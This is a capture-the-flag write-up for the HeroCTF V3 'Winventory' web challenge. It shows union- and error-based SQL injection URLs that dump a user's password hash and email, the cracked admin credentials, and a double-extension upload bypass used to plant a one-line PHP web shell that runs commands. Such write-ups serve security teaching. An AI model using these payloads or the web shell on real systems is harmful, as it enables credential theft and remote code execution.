# Winventory - 250 pts

<p align="center">
  <img src="https://github.com/Endeavxor/CTF-Writeups/blob/b7436192dc04b8574cc6c82b4fedd583e0b394cd/2021/HeroCTF%20V3/Web/Winventory/img/challenge.png" />
</p>


## TLDR :
* Find and exploit SQL Injection (Union Based & Error Based)
* Bypass filters on admin pannel in order to upload your PHP reverse shell


## Step 1 : Discover the website

When we arrive on the site we come across this classic login page  

<p align="center">
  <img src="https://github.com/Endeavxor/CTF-Writeups/blob/b7436192dc04b8574cc6c82b4fedd583e0b394cd/2021/HeroCTF%20V3/Web/Winventory/img/login.png" />
</p>


After a few attempts to search for classic vulnerabilities (ServerSide Template Injection,SQLi,etc...) which did not yield anything, I create an account and log in to discover the rest of the site. Once connected, you come across a book manager in which you can add books and manage them later.

<p align="center">
  <img src="https://github.com/Endeavxor/CTF-Writeups/blob/b7436192dc04b8574cc6c82b4fedd583e0b394cd/2021/HeroCTF%20V3/Web/Winventory/img/mainpage.gif" />
</p>

As you can see your library is very empty, so let's add a book to it.

<p align="center">
  <img src="https://github.com/Endeavxor/CTF-Writeups/blob/5fd4cbfeffd605b0e01fc738c34b819a24b94f95/2021/HeroCTF%20V3/Web/Winventory/img/addBook.png" />
</p>


Now that we have added a book, we can search for it in the "Search" tab and manage it. And that's where the interesting things will start ....

## Step 2 : Finding and exploiting SQLi

<p align="center">
  <img src="https://github.com/Endeavxor/CTF-Writeups/blob/5fd4cbfeffd605b0e01fc738c34b819a24b94f95/2021/HeroCTF%20V3/Web/Winventory/img/triggerSQLi.gif" />
</p>


As you can see, the site retrieves the id in the URL in order to find the book that we want to manage, this is very reminiscent of the possibility of an SQL injection, which is confirmed when the addition of the quotation mark causes the error. The first information is the type of database which is MySQL(=MariaDB). As a first approach I tell myself that if the response to the request sent contains more lines (and therefore several books) they will all be displayed on this page: it will therefore be necessary first to determine the exact number of columns in the table which stores the books so that you can do a UNION query with a dummy entry.  

`http://chall2.heroctf.fr:8050/?page=manageBook&id=78456 UNION SELECT NULL,NULL,NULL,NULL,NULL -- -`  

<p align="center">
  <img src="https://github.com/Endeavxor/CTF-Writeups/blob/5fd4cbfeffd605b0e01fc738c34b819a24b94f95/2021/HeroCTF%20V3/Web/Winventory/img/step1.png" />
</p>


After some tries by incrementing the number of NULL values ...  

`http://chall2.heroctf.fr:8050/?page=manageBook&id=78456 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL- --`  

<p align="center">
  <img src="https://github.com/Endeavxor/CTF-Writeups/blob/5fd4cbfeffd605b0e01fc738c34b819a24b94f95/2021/HeroCTF%20V3/Web/Winventory/img/step2.png" />
</p>

There are therefore 9 columns in the table. The first column should be the id, which is confirmed (and leads to an injection error based) when retrieving the version of MySQL  

`http://chall2.heroctf.fr:8050/?page=manageBook&id=78456 UNION SELECT @@version,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL- --`  

<p align="center">
  <img src="https://github.com/Endeavxor/CTF-Writeups/blob/5fd4cbfeffd605b0e01fc738c34b819a24b94f95/2021/HeroCTF%20V3/Web/Winventory/img/step3.png" />
</p>

Everything that will be indicated in the first field of our UNION in the url will display an error because the database expects an integer for the ID column, we will therefore be able to extract information including user logins and passwords. Luckily the tables and the names of the columns where the connection information is stored are predictable:

`http://chall2.heroctf.fr:8050/?page=manageBook&id=78456 UNION SELECT (SELECT password from users LIMIT 1),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -`  

<p align="center">
  <img src="https://github.com/Endeavxor/CTF-Writeups/blob/5fd4cbfeffd605b0e01fc738c34b819a24b94f95/2021/HeroCTF%20V3/Web/Winventory/img/step4.png" />
</p>

A hash password is returned to us (pray that it is from the admin), after a quick search it is an MD5 hash which corresponds to : urfaceismassive = MD5(6431468f98f6552c3af0816307f91c06)  
Now we need to find the username :

`http://chall2.heroctf.fr:8050/?page=manageBook&id=78456 UNION SELECT (SELECT username from users LIMIT 1),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -`  

<p align="center">
  <img src="https://github.com/Endeavxor/CTF-Writeups/blob/5fd4cbfeffd605b0e01fc738c34b819a24b94f95/2021/HeroCTF%20V3/Web/Winventory/img/step5.png" />
</p>

There is apparently no username column, let's test if there is an email column :  
`http://chall2.heroctf.fr:8050/?page=manageBook&id=78456 UNION SELECT (SELECT email from users LIMIT 1),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -`  
<p align="center">
  <img src="https://github.com/Endeavxor/CTF-Writeups/blob/5fd4cbfeffd605b0e01fc738c34b819a24b94f95/2021/HeroCTF%20V3/Web/Winventory/img/step6.png" />
</p>

An email is returned : admin@adminozor.fr. Let's try to connect with these credentials, and ................... BINGO it works

## Step 3 : Go to admin pannel and bypass filters to upload your own PHP reverse shell.  

So we are logged in as admin a tab attracts our attention: "Administration"

<p align="center">
  <img src="https://github.com/Endeavxor/CTF-Writeups/blob/5fd4cbfeffd605b0e01fc738c34b819a24b94f95/2021/HeroCTF%20V3/Web/Winventory/img/admin.gif" />
</p>


Once on this page, we upload an image.jpg for testing, and it works:

<p align="center">
  <img src="https://github.com/Endeavxor/CTF-Writeups/blob/5fd4cbfeffd605b0e01fc738c34b819a24b94f95/2021/HeroCTF%20V3/Web/Winventory/img/step7.png" />
</p>


But when we upload an image.php file (our shell) it doesn't work :

<p align="center">
  <img src="https://github.com/Endeavxor/CTF-Writeups/blob/5fd4cbfeffd605b0e01fc738c34b819a24b94f95/2021/HeroCTF%20V3/Web/Winventory/img/step8.png" />
</p>


We will therefore have to bypass these filters, there are several ways and the most classic is adding a double extension to our filename, like this: image.jpg.php (Why would that work? Well it could be that the backend code that handle file upload split file name on the "." but only check the second element(the extension of the file) assuming the filenames are only of the form something.extension)

Our image.jpg.php :

```php
<?php
  system($_GET['cmd']);
?>
```

And ................. BINGO it works : 

Now we just have to browse through the server directories and hope to find a dodgy file that might contain the flag, which can be found quickly:

<p align="center">
  <img src="https://github.com/Endeavxor/CTF-Writeups/blob/5fd4cbfeffd605b0e01fc738c34b819a24b94f95/2021/HeroCTF%20V3/Web/Winventory/img/reverseshell.gif" />
</p>

<p align="center">
  <b>FLAG : Hero{sql1_t0_lf1_t0_rc3_b4d_s3cur1ty}</b>
</p>






